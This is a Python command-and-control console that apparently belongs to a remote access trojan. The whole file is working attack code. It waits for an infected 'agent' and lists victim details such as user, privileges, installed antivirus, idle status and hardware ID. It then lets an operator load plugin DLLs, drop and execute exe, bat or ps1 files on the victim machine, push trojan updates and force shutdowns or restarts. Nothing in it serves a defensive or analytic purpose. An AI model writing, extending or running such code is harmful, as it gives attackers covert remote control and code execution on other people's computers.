import argparse
import base64
import os
import socket

FIELDS = [
    "Country", "Nickname", "Tag", "User", "Version", "Privileges",
    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFK",
    "Ping", "HWID", "Fingerprint",
]

HELP_TEXT = """Commands:
  close / exit / quit        Disconnect the agent
  reconnect                  Reconnect the agent
  sleep / hibernate          Power commands
  restart / shutdown         Power commands
  load:<path>                Load a plugin DLL
  unload:<id>                Unload a loaded plugin
  event:<name>               Fire a plugin event
  execute:<ext>:<path>       Drop and run a file on the agent
                             ext: exe | bat | ps1
  update:<path>              Send the file bytes; the agent chooses <agent>_update.exe
  <path>                     Shorthand for load:<path>"""

def read_line(s):
    b = bytearray()
    while True:
        c = s.recv(1)
        if not c or c == b"\n":
            return bytes(b).decode(errors="replace").rstrip("\r")
        b.extend(c)

def show(line):
    if not line.startswith("DATA:"):
        print(line)
        return
    vals = line[5:].split("|")
    for i, name in enumerate(FIELDS):
        print(f"{name}: {vals[i] if i < len(vals) else 'Unknown'}")

def wait_result(s):
    while True:
        line = read_line(s)
        if not line:
            return line
        if line.startswith("DATA:"):
            show(line)
            continue
        if line == "HB":
            s.sendall(b"PONG\n")
            continue
        if line == "ACK:UPDATE":
            return line
        print(line)
        if line.startswith("ACK:") or line.startswith("ERR:"):
            return line

def plugin_cmd(path):
    with open(path, "rb") as f:
        data = f.read()
    stem = os.path.splitext(os.path.basename(path))[0]
    b64 = base64.b64encode(data).decode()
    return f"CMD:PLUGIN:{stem}:{b64}"

def update_cmd(path):
    with open(path, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()
    return f"CMD:UPDATE:{b64}"

def execute_cmd(ext, path):
    with open(path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    return f"CMD:EXECUTE:{ext.lower()}:{b64}"

def accept_agent(server, timeout=None):
    previous = server.gettimeout()
    if timeout is not None:
        server.settimeout(timeout)
    try:
        while True:
            conn, addr = server.accept()
            conn.settimeout(15)
            hello = read_line(conn)
            if hello == "HELLO:UPDATE":
                conn.close()
                continue
            if not hello:
                conn.close()
                raise RuntimeError("agent disconnected before HELLO")
            print(f"connected {addr[0]}")
            print(hello)
            return conn
    finally:
        server.settimeout(previous)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4793)
    ap.add_argument("--test")
    a = ap.parse_args()

    with socket.create_server((a.ip, a.port)) as server:
        print(f"listening {a.ip}:{a.port}")
        conn = accept_agent(server)
        with conn:
            if a.test:
                stem = os.path.splitext(os.path.basename(a.test))[0]
                cmds = [
                    plugin_cmd(a.test),
                    "CMD:PLUGIN_EVENT:ping",
                    f"CMD:UNLOAD:{stem}",
                    "CMD:CLOSE",
                ]
                for cmd in cmds:
                    conn.sendall((cmd + "\n").encode())
                    result = wait_result(conn)
                    if result.startswith("ERR:") or not result:
                        raise SystemExit(1)
                return
            while True:
                try:
                    cmd = input("> ").strip()
                except (EOFError, KeyboardInterrupt):
                    return
                if not cmd:
                    continue
                lc = cmd.lower()
                if lc == "--help":
                    print(HELP_TEXT)
                    continue
                if lc in {"close", "exit", "quit"}:
                    conn.sendall(b"CMD:CLOSE\n")
                elif lc in {"reconnect", "sleep", "hibernate", "restart", "shutdown"}:
                    conn.sendall((f"CMD:{lc.upper()}\n").encode())
                elif lc.startswith("unload:"):
                    conn.sendall((f"CMD:UNLOAD:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("event:"):
                    conn.sendall((f"CMD:PLUGIN_EVENT:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("load:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((plugin_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("execute:"):
                    rest = cmd.split(":", 2)
                    if len(rest) < 3:
                        print("usage: execute:<ext>:<path>")
                        continue
                    ext, path = rest[1].strip(), rest[2].strip()
                    if ext.lower() not in {"exe", "bat", "ps1"}:
                        print("error: ext must be exe, bat, or ps1")
                        continue
                    try:
                        conn.sendall((execute_cmd(ext, path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("update:"):
                    path = cmd.split(":", 1)[1].strip()
                    if not path:
                        print("usage: update:<path>")
                        continue
                    try:
                        conn.sendall((update_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                else:
                    try:
                        conn.sendall((plugin_cmd(cmd) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                result = wait_result(conn)
                if not result:
                    return
                if lc.startswith("update:"):
                    if result == "ACK:UPDATE":
                        print("update handoff accepted; waiting for successor")
                        conn.close()
                        conn = accept_agent(server, timeout=30)
                        print("update restored")
                        continue
                if lc in {"close", "exit", "quit"}:
                    return

if __name__ == "__main__":
    main()
